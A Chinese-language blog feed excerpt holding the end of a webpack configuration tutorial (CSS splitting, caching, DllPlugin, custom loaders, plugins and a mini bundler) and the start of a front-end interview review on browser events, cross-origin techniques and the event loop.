&#123; loader: 'css-loader', options: &#123; importLoaders: 2, &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: ['style-loader', 'css-loader', 'postcss-loader'] &#125; ] &#125;, plugins: [ new webpack.HotModuleReplacementPlugin() ], optimization:&#123; &#125;&#125;module.exports = merge(commonConfig,devConfig);// webpack.prod.jsconst MiniCssExtractPlugin = require('mini-css-extract-plugin');const merge = require('webpack-merge');const commonConfig = require('./webpack.common.js');const prodConfig = &#123; mode: 'production', devtool: 'cheap-module-source-map', plugins:[ new MiniCssExtractPlugin(&#123; // template 要引入的 filename:'[name].css', // 间接引入的走这个 chunkFilename:'[name].chunk.css' &#125;) ], module:&#123; rules:[ &#123; test: /\.scss$/, use: [ MiniCssExtractPlugin.loader, &#123; loader: 'css-loader', options: &#123; importLoaders: 2, &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'postcss-loader'] &#125; ] &#125;&#125;module.exports = merge(commonConfig,prodConfig); 将之前共同配置的 webpack,common.js module rules 里面关于css 的配置移动到 webpack.dev.js 里面不作修改。然后同样复制一遍到 webpack.prod.js 里面，把关于css-loader 里面的的 style-loader 换成 MiniCssExtractPlugin.loader 作为最后一步来处理。 一个要注意的点是在公共的 optimization 里面加了一个 usedExports：true,同时也要在 package.json 里面配置 sideEffects：[‘@babel/polyfill’,’*.css’] 运行 npm run build 便可以打包分割开 css 文件了 压缩 css 代码optimize-css-assets-webpack-plugin 123456789// webpack.prod.jsconst OptimizeCSSAssetsPlugin = require('optimize-css-assets-webpack-plugin');module.exports =&#123; optimization:&#123; minimizer:[ new OptimizeCSSAssetPlugin(&#123;&#125;) ] &#125;&#125; 多个css文件打包到同一个css里面12345678910111213141516// webpack.prod.jsmodule.exports =&#123; optimization:&#123; // 底层依旧是 splitChunks 实现的 splitChunks:&#123; cacheGroups:&#123; styles:&#123; name:'styles', test:/\.css$/, chunks:'all', enforce:true &#125; &#125; &#125; &#125;&#125; 多个css文件按入口文件来打包123456789101112131415161718192021// webpack.prod.jsmodule.exports = &#123; optimization:&#123; splitChunks:&#123; cacheGroups:&#123; fooStyles:&#123; name:'foo', test: (m, c, entry = 'foo') =&gt; m.constructor.name === 'CssModule' &amp;&amp; recursiveIssuer(m) === entry, chunks:'all', enforce:true &#125;, barStyles:&#123; name:'bar', test: (m, c, entry = 'foo') =&gt; m.constructor.name === 'CssModule' &amp;&amp; recursiveIssuer(m) === entry, chunks:'all', enforce:true &#125; &#125; &#125; &#125;&#125; Webpack 与浏览器缓存（Caching）增加 hash 值,如果文件没有改变的话，那么打包前后几次打包出来的文件里面的哈希值就不会发生变化，浏览器的缓存也就起到了作用。如果改变了，浏览器则会去请求先的文件而不是继续用原来的缓存文件 1234567// webpack.prod.jsmodule.exports =&#123; output:&#123; filename:'[name].[contenthash].js', chunkFilename:'[name].[contenthash].js' &#125;&#125; 上面的配置是新版本的webpack直接有的，但是旧版本的 webpack 每次打包 hash 值都会发生变化，可以在 webpack.common.js 里面配置一个参数 1234567module.exports = &#123; optimization:&#123; runtimeChunk:&#123; name:'runtime' &#125; &#125;&#125; 这个参数会把旧版本中的 manifest 单独抽离出来一个 runtime 开头的 js文件里面，这个 文件主要描述的是库与业务逻辑代码之间的一些关系，旧版本webpack 中这个关系会因为每次打包而发生变化。 Shimming自动引入某个库123456789module.exports =&#123; plugins:[ new webpack.ProvidePlugin(&#123; _:'lodash', // 花式引用 _join:['lodash','join'] &#125;) ]&#125; 全局this 指向 windowimports-loader 12345678910111213module.exports =&#123; module:&#123; rules:[&#123; test:/\.js$/, exclude:/node_modules/, use:[&#123; loader:'babel-loader' &#125;,&#123; loader:'imports-loader？this=&gt;window' &#125;] &#125;] &#125;&#125; 环境变量可以考虑使用，用个人，具体是在 package.json 里面传递一个 env 参数 1234567&#123; "scripts": &#123; "dev-build": "webpack --profile --json &gt; stats.json --config ./build/webpack.common.js", "dev": "webpack-dev-server --config ./build/webpack.common.js", "build": "webpack --env.production --config ./build/webpack.common.js" &#125;,&#125; 而 开发与生产环境的webpack 则是都放到 common 里面来判断分发 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158// webpack.dev.jsconst webpack = require('webpack');const path = require('path');const devConfig = &#123; mode: 'development', devtool: 'cheap-module-eval-source-map', devServer: &#123; contentBase: './dist', open: true, port: 8080, hot: true &#125;, module:&#123; rules:[ &#123; test: /\.scss$/, use: [ 'style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 2, &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: ['style-loader', 'css-loader', 'postcss-loader'] &#125; ] &#125;, plugins: [ new webpack.HotModuleReplacementPlugin() ], output: &#123; publicPath: './', filename: '[name].js', chunkFilename:'[name].js', path: path.resolve(__dirname, '../dist') &#125;&#125;module.exports = devConfig;// webpack.prod.jsconst MiniCssExtractPlugin = require('mini-css-extract-plugin');const OptimizeCSSAssetsPlugin = require('optimize-css-assets-webpack-plugin');const prodConfig = &#123; mode: 'production', devtool: 'cheap-module-source-map', module:&#123; rules:[ &#123; test: /\.scss$/, use: [ MiniCssExtractPlugin.loader, &#123; loader: 'css-loader', options: &#123; importLoaders: 2, &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'postcss-loader'] &#125; ] &#125;, optimization:&#123; minimizer:[ new OptimizeCSSAssetsPlugin(&#123;&#125;) ] &#125;, plugins:[ new MiniCssExtractPlugin(&#123; filename:'[name].css', chunkFilename:'[name].chunk.css' &#125;) ], output: &#123; publicPath: './', filename: '[name].[contenthash].js', chunkFilename:'[name].[contenthash].js', &#125;&#125;module.exports = prodConfig;// webpack.common.jsconst webpack = require('webpack')const path = require('path');const HtmlWebpackPlugin = require('html-webpack-plugin');const CleanWebpackPlugin = require('clean-webpack-plugin');const merge =require('webpack-merge');const devConfig = require('./webpack.dev.js');const prodConfig = require('./webpack.prod.js');const commonConfig = &#123; entry: &#123; main: './src/index.js' &#125;, module: &#123; rules: [&#123; test:/\.js$/, exclude:/node_modules/, use:[&#123; loader:'babel-loader' &#125;,&#123; loader:'imports-loader?this=&gt;window' &#125;] &#125;,&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', limit: 2048 &#125; &#125; &#125;, &#123; test: /\.(eot|ttf|svg|woff)$/, use: &#123; loader: 'file-loader' &#125; &#125;] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin(&#123; cleanOnceBeforeBuildPatterns:[path.resolve(__dirname,'../dist')], &#125;), new webpack.ProvidePlugin(&#123; _:'lodash' &#125;) ], optimization:&#123; usedExports:true, splitChunks:&#123; chunks:'all' &#125; &#125;&#125;module.exports = (env)=&gt;&#123; if(env &amp;&amp; env.production)&#123; return merge(commonConfig,prodConfig) &#125;else&#123; return merge(commonConfig,devConfig) &#125;&#125; Library 的打包简单配置 12345678910111213141516// webpack.config.jsconst path = require('path');module.exports = &#123; mode: 'production', entry: './src/index.js', externals: ['lodash'], output: &#123; path:path.resolve(__dirname,'dist'), filename:'library.js', // 可以通过 script src=library.js 来引用这个库 library:'library', // 通用打包 CommonJS 或者 UMD，上面文件的挂载处（可以为this 或者 window） libraryTarget:'umd' &#125;,&#125; PWA(Progressive Web Application) 的打包网站在被访问过一次之后，如果服务器挂掉了，浏览器还可以利用缓存来访问这个网站。 workbox-webpack-plugin 123456789// 配置 webpack.prod.jsmodule.exports = &#123; plugins:[ new WorkboxPlugin.GenerateSW(&#123; clientsClaim:true, skipWaiting:true &#125;) ]&#125; 之后打包编译的是时候会生成多一个 service-worker.js 文件，在项目中运用 12345678// index.jsif('serviceWorker' in navigator)&#123; navigator.serviceWorker.register('/service-worker.js').then(registration=&gt;&#123; console.log('service-worker registed'); &#125;).catch(error=&gt;&#123; console.log('service-worker register error'); &#125;)&#125; 这样配置之后，当用户访问过一次网站之后便会进行缓存，如果当服务器挂掉的时候，用户还是可以在浏览器访问到网站 TypeScript 的打包配置webpack基本配置 1234567891011121314151617const path = require('path');module.exports = &#123; mode:'production', entry:'./src/index.tsx', module:&#123; rules:[&#123; test:/\.tsx?$/, use:'ts-loader', exclude:/node_modules/ &#125;] &#125;, output:&#123; filename:'bundle.js', path:path.resolve(__dirname,'dist'); &#125;&#125; 除了webpack 配置之后，在 打包 ts 的时候还必须要配置一个 tsconfig.json 123456789101112&#123; "compilerOptions": &#123; // 出口 "outDir": "./dist", // 要处理的模块 "module": "es6", // 编译成es5的 "target": "es5", // 运行在文件中引入其他的js "allowJs": true &#125;&#125; 如果要引入其他的库，例如 lodash ，需要安装对应的说明，@types/lodash ，具体的可以查看这里 WebpackDevServer开发环境实现请求代理转发12345678910111213141516171819202122232425262728293031323334// 基本配置module.exports = &#123; devServer: &#123; contentBase: './dist', open: true, port: 8080, hot: true, hotOnly: true, proxy: &#123; '/react/api': &#123; // 代理转发的url target: 'https://www.dell-lee.com/', // 当是 https 的时候可以设置这个参数 secure: false, // 拦截 bypass: function (req, res, proxyOptions) &#123; if (req.headers.accept.indexOf('html') !== 1) &#123; console.log('Shipping proxy for browser request'); return '/index.html'; &#125; &#125;, // 路径重写 pathRewrite: &#123; 'header.json': 'demo.json' &#125;, // 配置 headers 主机名与cookie 等等 headers:&#123; host:'xx', cookie:'' &#125; &#125;, &#125; &#125;&#125; 具体文档 底层是 webpack-dev-middleware 解决单页面应用路由问题当配置路由发现找不到内容的时候，可以配置 historyApiFallback ESLint 的配置先安装 1npm i eslint -D 接着是初始化配置 1eslint -init 采用目前流行 airbnb 的方式 会看到项目生成一个 .eslintrc.js 如果没有使用vscode 只能用 eslint src 命令行来查看错误信息 可以进行基本配置： 12345678910module.exports = &#123; "extends": "airbnb", "parser": "babel-eslint", "rules": &#123; "": 0 &#125;, globals:&#123; document &#125;&#125;; eslint-loaderwebpack 也有先关的配置，但是会影响打包的速度，一般会建议使用这种方式来配置。还是使用 vscode 的插件式 1234567891011121314151617module.exports = &#123; module: &#123; rules: [&#123; test: /\.js$/, exclude: /node_modules/, use: [ &#123; loader: 'babel-loader' &#125;, &#123; loader: 'eslint-loader', options: &#123; // 自动修复 fix: true &#125; &#125; ] &#125;&#125; 具体点击 devServer 配置 overlay 可以在页面提示错误信息 webpack 性能优化1.升级工具的版本（node,npm,yarn） 2.loader（include/exclude）在尽可能少的模块上使用 3.plugin 尽可能精简可靠 4.resolve 参数合理 123456789module.exports =&#123; resolve:&#123; extensions:['.js','.jsx'], // 使用别名 alias:&#123; haha:path.resolve(__dirname,'../src/child/'); &#125; &#125;&#125; 5.使用 DllPlugin 提高打包速度 add-asset-html-webpack-plugin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// webpack.dll.js// 将共用的库放到一个文件里面去单独打包，用 library 暴露出来。然后用 webpack.DllPlugin 这个插件对这些库分析出一种文件关系映射.json 文件const path = require('path');const webpack =require('webpack');module.exports = &#123; mode: 'production', entry: &#123; vendors: ['lodash'], react: ['react', 'react-dom'], &#125;, output: &#123; filename: '[name].dll.js', path: path.resolve(__dirname, '../dll'), library: '[name]' &#125;, plugins:[ new webpack.DllPlugin(&#123; name:'[name]', path:path.resolve(__dirname,'../dll/[name].manifest.json') &#125;) ]&#125;// 在webpack.common.js 文件里面配置（也可以只配置生产环境）,将上面生成文件挂载到 template index.html上面module.exports = &#123; plugins:[ new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll/verndors.dll.js') &#125;), new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll/react.dll.js') &#125;), new webpack.DllRefercencePlugin(&#123; mainfest:path.resolve(__dirname,'../dll/vendors.mainfest.json') &#125;), new webpack.DllRefercencePlugin(&#123; mainfest:path.resolve(__dirname,'../dll/react.mainfest.json') &#125;) ]&#125;// 进行优化自动注入const fs = require('fs');const plugins = [ new HtmlWebpackPlugin(&#123; template:'src/index.html' &#125;), new CleanWebpackPlugin(&#123; cleanOnceBeforeBuildPatterns: [path.resolve(__dirname, '../dist')], &#125;)]const files = fs.readdirSync(path.resolve(__dirname,'../dll'))files.forEach(file=&gt;&#123; if(/.*\.dll.js/.test(file))&#123; plugins.push(new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll',file) &#125;)) &#125; if(/.*\.mainfest.json/.test(file))&#123; plugins.push(new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll',file) &#125;)) &#125; &#125;)module.exports = &#123; plugins,&#125; 6.控制包文件的大小 7.thread-loader,parallel-webpack,happypack 多进程打包 8.合理使用 sourceMap(信息越详细打包越久) 9.结合打包分析 stats.json 优化分析 10.开发环境内存编译，无用插件剔除 多页面打包配置12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// webpack.common.jsmodule.exports = &#123; entry: &#123; main: './src/index.js', list: './src/list.js', &#125;, plugins:[ new HtmlWebpackPlugin(&#123; filename:'index.html', template: 'src/index.html', chunks:['runtime','vendors','main'] &#125;), new HtmlWebpackPlugin(&#123; filename:'list.html', template: 'src/index.html', chunks:['runtime','vendors','list'] &#125;), ] &#125;// 优化const configs = &#123; entry: &#123; main: './src/index.js', list: './src/list.js', &#125;, // 其他所有配置&#125;const makePlugins = (configs)=&gt;&#123; const plugins = ['其他的plugins']; Object.keys(configs.entry).forEach(item=&gt;&#123; plugins.push( new HtmlWebpackPlugin(&#123; template:'src/index.html', filename:`$&#123;item&#125;.html`, chunks:['runtime','vendors','item'] &#125;) ) &#125;) // 上面优化的代码 const files = fs.readdirSync(path.resolve(__dirname,'../dll')) files.forEach(file=&gt;&#123; if(/.*\.dll.js/.test(file))&#123; plugins.push(new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll',file) &#125;)) &#125; if(/.*\.mainfest.json/.test(file))&#123; plugins.push(new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll',file) &#125;)) &#125; &#125;) return plugins;&#125;configs.plugins = makePlugins(configs);module.export = configs; 如何编写一个 Loader简单的实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// replaceLoader.js // loader-utils 是官方一个符合 loader 规范的工具const loaderUtils = require('loader-utils');module.exports = function (source) &#123; return source.replace('haha', 'world');&#125;// replaceLoaderAsync.js const loaderUtils = require('loader-utils');module.exports = function (source) &#123; const options = loaderUtils.getOptions(this); const callback = this.async(); setTimeout(() =&gt; &#123; const result = source.replace('lbh', options.name); callback(null, result); &#125;, 1000)&#125;// index.jsconsole.log('hello lbh');// webpack.config.jsconst path = require('path');module.exports = &#123; mode: 'development', entry: &#123; main: './src/index.js' &#125;, // loader 的位置，先查找 node_modules 如果没有就往下找，那么自定义的 loader 就不用写全路径了 resolveLoader: &#123; modules: ['node_modules', './loaders'] &#125;, module: &#123; rules: [ &#123; test: /\.js?$/, use: [&#123; loader: 'replaceLoader.js', &#125;, &#123; loader: 'replaceLoaderAsync.js', options: &#123; name: 'haha' &#125; &#125;] &#125; ] &#125;, output: &#123; filename: '[name].js', path: path.resolve(__dirname, 'dist') &#125;&#125; 自定义 loader 的用途很多，可以拿来做一个简单的错误检验 123456const loaderUtils = require('loader-utils');module.exports = function (source) &#123; try(function()&#123;&#125;)catch(e)&#123;&#125; return source.replace('haha', 'world');&#125; 或者是国际化,在相关页面弄一个占位符 1234567module.exports = function (source) &#123; if(Node全局变量 === '中文')&#123; source.replace('&#123;&#123;title&#125;&#125;', '中文标题'); &#125;else&#123; source.replace('&#123;&#123;title&#125;&#125;', 'engilsh title'); &#125; &#125; 可以具体参数可以点击这里 如何编写一个 Plugin简单的实现 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// plugin/copyright-webpack-pluginclass CopyRightWebpackPlugin &#123; constructor(options) &#123; console.log(options) &#125; //compiler:webpack 的实例 apply(compiler) &#123; // 同步 compiler.hooks.compile.tap('CopyRightWebpackPlugin', (compilation) =&gt; &#123; console.log('compiler'); &#125;) // 异步 compiler.hooks.emit.tapAsync('CopyRightWebpackPlugin', (compilation, cb) =&gt; &#123; debugger; compilation.assets['copyright.txt']=&#123; source:function()&#123; return 'copyright by hahaha' &#125;, size:function()&#123; return 19; &#125; &#125; cb(); &#125;) &#125;&#125;module.exports = CopyRightWebpackPlugin;// 配置 webpack.config.jsconst path = require('path');const CopyRightWebpackPlugin = require('./plugin/copyright-webpack-plugin.js');module.exports = &#123; mode: 'development', entry: &#123; 'main': './src/index.js' &#125;, plugins: [ new CopyRightWebpackPlugin(&#123; name:'haha' &#125;) ], output: &#123; filename: '[name].js', path: path.resolve(__dirname, 'dist') &#125;&#125; 调试 123456789101112131415161718&#123; "name": "plugin", "version": "1.0.0", "description": "", "main": "index.js", "scripts": &#123; "build": "webpack", "debug": "node --inspect --inspect-brk node_modules/webpack/bin/webpack.js", "test": "echo \"Error: no test specified\" &amp;&amp; exit 1" &#125;, "keywords": [], "author": "", "license": "ISC", "devDependencies": &#123; "webpack": "^4.30.0", "webpack-cli": "^3.3.0" &#125;&#125; npm run debug 进入下一步，添加 watch compilation 可以对一些类似这样的参数进行调试观察 具体的可以点击这里 Bundler 源码编写（模块分析）文件目录src 下面有三个文件，分别是 index.js message.js word.js ，引用关系是从左到右导入下一个的文件，具体代码如下： 1234567891011121314// word.jsexport const word = 'hello'// message.jsimport &#123; word &#125; from './word.js'const message = `say $&#123;word&#125;`export default message; // index.jsimport message from './message.js'console.log(message); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889// 基本配置const fs = require('fs');const path = require('path');const parser = require('@babel/parser');const traverse = require('@babel/traverse').default;const babel = require('@babel/core');// 入口文件的分析const moduleAnalyser = (filename) =&gt; &#123; const content = fs.readFileSync(filename, 'utf-8'); // 抽象语法树 const ast = parser.parse(content, &#123; sourceType: 'module' &#125;); // 依赖文件，键值对，键：依赖文件的相对路径，值：依赖文件的相对于bundler 的路径（绝对路径） const dependencies = &#123;&#125;; // 分析抽象语法树 traverse(ast, &#123; // 入口声明 ImportDeclaration(&#123; node &#125;) &#123; // 路径转换 const dirname = path.dirname(filename); const newFile = './' + path.join(dirname, node.source.value) dependencies[node.source.value] = newFile &#125; &#125;) // 抽象语法树的转换，提取可以在浏览器运行的代码 const &#123; code &#125; = babel.transformFromAst(ast, null, &#123; // 插件的集合 presets: ["@babel/preset-env"] &#125;) return &#123; filename, dependencies, code &#125;&#125;// 依赖图谱const makeDependenciesGraph = (entry) =&gt; &#123; const entryModule = moduleAnalyser(entry) const graphArray = [entryModule]; for (let i = 0; i &lt; graphArray.length; i++) &#123; const item = graphArray[i]; // 获取依赖关系 const &#123; dependencies &#125; = item; if (dependencies) &#123; for (let j in dependencies) &#123; graphArray.push( moduleAnalyser(dependencies[j]) ) &#125; &#125; &#125; // 格式转换 const graph = &#123;&#125; graphArray.forEach(item =&gt; &#123; graph[item.filename] = &#123; dependencies: item.dependencies, code: item.code &#125; &#125;) return graph;&#125;// 生成浏览器可以用的代码const generateCode = (entry) =&gt; &#123; // 转为字符串 const graph = JSON.stringify(makeDependenciesGraph(entry)); // graph code 里面有 exports 跟 require 的方法,但是浏览器没有这两个函数，需要我们自己去实现 console.log(graph); return ` (function (graph) &#123; function require(module) &#123; function localRequire(relativePath) &#123; return require(graph[module].dependencies[relativePath]) &#125; var exports = &#123;&#125;; (function (require, exports, code) &#123; eval(code) &#125;)(localRequire, exports, graph[module].code); return exports; &#125; require('$&#123;entry&#125;') &#125;)($&#123; graph&#125;) `;&#125;const Info = generateCode('./src/index.js');console.log(Info); 运行 1node bundler.js | highlight 控制台输出 12345678910111213(function (graph) &#123; function require(module) &#123; // ./message.js 通过相对路径来拿到绝对路径 function localRequire(relativePath) &#123; return require(graph[module].dependencies[relativePath]) &#125; var exports = &#123;&#125;; (function (require, exports, code) &#123; eval(code) &#125;)(localRequire, exports, graph[module].code); return exports; &#125; require('./src/index.js')&#125;)(&#123;"./src/index.js":&#123;"dependencies":&#123;"./message.js":"./src\\message.js"&#125;,"code":"\"use strict\";\n\nvar _message = _interopRequireDefault(require(\"./message.js\"));\n\nfunction _interopRequireDefault(obj) &#123; return obj &amp;&amp; obj.__esModule ? obj : &#123; \"default\": obj &#125;; &#125;\n\nconsole.log(_message[\"default\"]);"&#125;,"./src\\message.js":&#123;"dependencies":&#123;"./word.js":"./src\\word.js"&#125;,"code":"\"use strict\";\n\nObject.defineProperty(exports, \"__esModule\", &#123;\n value: true\n&#125;);\nexports[\"default\"] = void 0;\n\nvar _word = require(\"./word.js\");\n\nvar message = \"say \".concat(_word.word);\nvar _default = message;\nexports[\"default\"] = _default;"&#125;,"./src\\word.js":&#123;"dependencies":&#123;&#125;,"code":"\"use strict\";\n\nObject.defineProperty(exports, \"__esModule\", &#123;\n value: true\n&#125;);\nexports.word = void 0;\nvar word = 'hello';\nexports.word = word;"&#125;&#125;) 复制粘贴到浏览器便可以运行 graph 输出内容是 123456789101112131415161718&#123; "./src/index.js": &#123; "dependencies": &#123; "./message.js": "./src\\message.js" &#125;, "code": "\"use strict\";\n\nvar _message = _interopRequireDefault(require(\"./message.js\"));\n\nfunction _interopRequireDefault(obj) &#123; return obj &amp;&amp; obj.__esModule ? obj : &#123; \"default\": obj &#125;; &#125;\n\nconsole.log(_message[\"default\"]);" &#125;, "./src\\message.js": &#123; "dependencies": &#123; "./word.js": "./src\\word.js" &#125;, "code": "\"use strict\";\n\nObject.defineProperty(exports, \"__esModule\", &#123;\n value: true\n&#125;);\nexports[\"default\"] = void 0;\n\nvar _word = require(\"./word.js\");\n\nvar message = \"say \".concat(_word.word);\nvar _default = message;\nexports[\"default\"] = _default;" &#125;, "./src\\word.js": &#123; "dependencies": &#123;&#125;, "code": "\"use strict\";\n\nObject.defineProperty(exports, \"__esModule\", &#123;\n value: true\n&#125;);\nexports.word = void 0;\nvar word = 'hello';\nexports.word = word;" &#125;&#125; 可以看到 code 里面的内容有一个require 函数和一个 exports 对象，所以为了这些代码能够在浏览器运行，我们需要自己创建一个 require函数和exports 空对象。]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试题目汇总摘录（浏览器与性能基础篇）]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9F%BA%E7%A1%80%E7%AF%87.html</url>
    <content type="text"><![CDATA[温故而知新，保持空杯心态.续 前端面试之道继续复习浏览器相关内容 浏览器基础事件机制事件触发三阶段 window 往事件 触发处传播，遇到注册的捕获事件会触发 传播到事件触发处时触发注册的事件 从事件触发处往 window 传播，遇到注册的冒泡事件会触发 事件触发一般来说会按照上面的顺序进行，但是也有特例，如果给一个目标节点同时注册冒泡和捕获事件，事件触发会按照注册的顺序执行。 12345678910111213141516// 下面会先打印冒泡然后捕获node.addEventListener( 'click', event =&gt;&#123; console.log('冒泡'); &#125;, false)node.addEventListener( 'click', event =&gt;&#123; console.log('捕获'); &#125;, true ) 注册事件addEventListener 注册事件，改函数的第三个参数可以是布尔值，也可以是对象。对于布尔值 useCapture 参数来说，该参数默认值为 false。useCapture 决定了注册的事件是捕获事件还是冒泡事件。对于对象参数来说，可以使用下面几个属性： capture ，布尔值，和 useCapture 作用一样 once,布尔值，值为 true 表示该回调值调用一次，调用后会移除监听 passive，布尔值，表示永远不会调用 preventDefault 如果我们希望事件只触发在目标上，可以调用 stopPropagation 来阻止事件的进一步传播。通常我们认为 stopPropagation 是用来阻止事件冒泡的，其实该函数也可以阻止捕获事件。stopImmediatePropagation 同样也可以实现阻止事件，但是还能阻止该事件目标执行别的注册事件。 12345678910111213141516node.addEventListener( 'click', event =&gt;&#123; event.stopImmediatePropagation() console.log('冒泡'); &#125;, false);// 点击 node 只会执行上面的函数，下面的不会执行node.addEventListener( 'click', event =&gt;&#123; console.log('捕获'); &#125;, true) 事件代理如果一个节点中的子节点是动态生成的，那么子节点需要注册事件的话应该注册在父节点上面 12345678910111213&lt;ul id="ul"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; let ul = document.querySelector('#ul'); ul.addEventListener('click',event=&gt;&#123; console.log(event.target); &#125;);&lt;/script&gt; 事件代理的方法相对于直接给目标注册事件来说，有以下优点： 节省内存 不需要给子节点注销事件 跨域JSONPJSONP 原理很简单，就是利用 &lt;script&gt; 标签没有跨域限制的漏洞。通过 &lt;script&gt; 标签指向一个需要访问的地址并提供一个回调函数来接收数据当需要通讯的时候 123456&lt;script src="http://domain/api?param1=a&amp;param2=b&amp;callback=jsonp"&gt;&lt;/script&gt;&lt;script&gt; function jsonp(data)&#123; console.log(data) &#125;&lt;/script&gt; JSONP 使用简单且兼容性不错，但是只限于 get 请求 在开发中可能会遇到多个 JSONP 请求的回调函数名是相同的，这时候就需要自己封装一个 JSONP ，下面是简单的实现： 12345678910111213function jsonp(url,jsonpCallback,success)&#123; let script = document.createElement('script'); script.src = url; script.async = true; script.type = 'text/javascript' window[jsonpCallback] = function(data)&#123; success &amp;&amp; success(data) &#125; document.body.appendChild(script);&#125;jsonp('http://xxx','callback',function(value)&#123; console.log(value);&#125;); CORSCORS 需要浏览器和后端同时支持，IE8 和 9 需要通过 XDomainRequest 来实现 浏览器会自动进行 CORS 通信，实现 CORS 通信的关键是后端，只要后端实现了 CORS 就实现了跨域。 服务端设置了 Access-Control-Allow-Origin 就可以开启 CORS ,该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都是可以访问资源的。 会在发送请求时出现两种情况，分别为简单请求和复杂请求 简单请求 以Ajax 为例，当满足下面的条件的时候会触发简单请求 1.使用 Get,HEAD,POST 2.Content-type 的值仅限 text/plain,multipart/form-data,application/x-www-form-urlencoded 之一 请求中的任意 XMLHttpRequestUpload 对象均没有注册任何事件监听器，也可以使用 XMLHttpRequest.upload 属性访问 复杂请求 对于复杂的请求，首先会发起一个预检请求，该请求是 option 方法，通过该请求来指点服务端是否运行跨域请求。 对于预检请求，使用 Node 来设置 CORS 的话，可能会遇到一个坑，以 express 为例 123456app.use((req,res,next)=&gt;&#123; res.header('Access-Control-Allow-Origin','*') res.header('Access-Control-Allow-Methods','PUT,POST,GET,DELETE,OPTIONS') res.header('Access-Control-Allow-headers','Origin,X-Requested-With,Content-Type,Accept,Authorization,Access-Control-Allow-Credentials') next()&#125;) 上面的这个代码会验证 Authorization 子段，如果没有话的就会报错 当前端发起了复杂请求，返回的结果永远是报错的。因为预检请求也会进入到回调中，也会触发 next 方法，因为预检请求并不包含 Authorization 子弹，所以服务端也会报错。想要解决这个问题很简单，只要在 回调中过滤掉 option 就可以了 123res.statusCode = 204;res.setHeader('Content-Length','0');res.send(); document.domain该方式只能用于二级域名相同的情况下，比如 a.test.com 和 b.test.com 适用于该方式。 只需要给页面添加 document.domian = ‘test.com’ 表示二级域名都相同就可以实现跨域 postMessage这种方式通常用于获取嵌入页面中的第三方页面数据，一个页面发送消息，另一个页面判断来源并接受消息 12345678910// 发送消息端window.parent.postMessage('message','http://test.com');// 接受消息端const mc = new MessageChannel();mc.addEventListener('message',event=&gt;&#123; const origin = event.origin || event.originalEvent.origin; if(origin === 'http://test.com')&#123; console.log('验证通过'); &#125;&#125;) Event loopJS 是门非阻塞单线程语言 JS 在执行过程中会产生执行环境，这些执行环境会被顺序的加入到执行栈中。如果遇到异步的代码，会被挂起并加入到 Task(有多种 task) 队列中。一旦执行栈为空，Event Loop 就会从 Task 队列中拿出需要执行的代码并放入执行栈中执行，所以本质上来说 JS 中的异步还是同步行为。 12345678console.log('script start');setTimeout(function()&#123; console.log('setTimeout');&#125;,0);console.log('script end');// script start// script end// setTimeout 以上代码虽然 setTimeout 延时为 0，其实还是异步。这是因为 HTML5 标准规定这个函数第二个参数不得小于 4 毫秒，不足会自动增加。所以 setTimeout 还是会在 script end 之后打印。 不同的任务源会被分配到不同的 Task 队列中，任务源可以分为 微任务（microtask） 和 宏任务（macrotask）。在 ES6 规范中，microtask 称为 jobs，macrotask 称为 task。 123456789101112131415161718192021222324console.log('script start')setTimeout(function() &#123; console.log('setTimeout')&#125;, 0)new Promise(resolve =&gt; &#123; console.log('Promise') resolve()&#125;) .then(function() &#123; console.log('promise1') &#125;) .then(function() &#123; console.log('promise2') &#125;)console.log('script end')// script start// Promise// script end// promise1// promise2// setTimeout 微任务包括 process.nextTick ，promise ，Object.observe ，MutationObserver 宏任务包括 script ， setTimeout ，setInterval ，setImmediate ，I/O ，UI rendering 宏任务中包括了 script ，浏览器会先执行一个宏任务，接下来有异步代码的话就先执行微任务。 正确的一次 Event Loop 顺序是这样的 执行同步代码，属于宏观任务 执行栈为空，查询是否有微任务需要执行 执行所有微任务 必要的话渲染 UI 然后开始下一轮 Event Loop ，执行宏任务中的异步代码 如果宏任务中的异步代码有大量的计算并且需要操作 DOM 的话，为了更快的界面响应，可以把操作 DOM 放入 微任务中。 Node 的 Event loopNode 中的 Event loop 